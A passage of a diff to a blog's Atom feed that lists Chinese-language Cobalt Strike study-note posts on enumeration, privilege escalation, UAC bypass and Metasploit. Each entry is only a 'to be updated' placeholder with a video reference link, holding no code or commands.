+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】16、用户枚举三个关键步骤</title>
+    <link href="https://www.teamssix.com/year/200419-150615.html"/>
+    <id>https://www.teamssix.com/year/200419-150615.html</id>
+    <published>2020-04-19T07:06:15.000Z</published>
+    <updated>2020-04-19T07:21:20.895Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】15、枚举的命令和方法</title>
+    <link href="https://www.teamssix.com/year/200419-150608.html"/>
+    <id>https://www.teamssix.com/year/200419-150608.html</id>
+    <published>2020-04-19T07:06:08.000Z</published>
+    <updated>2020-04-19T07:21:16.584Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】14、powerup提权的方法</title>
+    <link href="https://www.teamssix.com/year/200419-150600.html"/>
+    <id>https://www.teamssix.com/year/200419-150600.html</id>
+    <published>2020-04-19T07:06:00.000Z</published>
+    <updated>2020-04-19T07:21:11.571Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】13、bypassuac</title>
+    <link href="https://www.teamssix.com/year/200419-150552.html"/>
+    <id>https://www.teamssix.com/year/200419-150552.html</id>
+    <published>2020-04-19T07:05:52.000Z</published>
+    <updated>2020-04-19T07:21:05.148Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】12、特权提升</title>
+    <link href="https://www.teamssix.com/year/200419-150546.html"/>
+    <id>https://www.teamssix.com/year/200419-150546.html</id>
+    <published>2020-04-19T07:05:46.000Z</published>
+    <updated>2020-04-19T07:21:01.121Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】11、用户驱动溢出攻击</title>
+    <link href="https://www.teamssix.com/year/200419-150538.html"/>
+    <id>https://www.teamssix.com/year/200419-150538.html</id>
+    <published>2020-04-19T07:05:38.000Z</published>
+    <updated>2020-04-19T07:20:57.342Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】10、如何管理Payload载荷</title>
+    <link href="https://www.teamssix.com/year/200419-150531.html"/>
+    <id>https://www.teamssix.com/year/200419-150531.html</id>
+    <published>2020-04-19T07:05:31.000Z</published>
+    <updated>2020-04-19T07:20:50.753Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】9、Metasploit框架</title>
+    <link href="https://www.teamssix.com/year/200419-150524.html"/>
+    <id>https://www.teamssix.com/year/200419-150524.html</id>
+    <published>2020-04-19T07:05:24.000Z</published>
+    <updated>2020-04-19T07:20:46.395Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
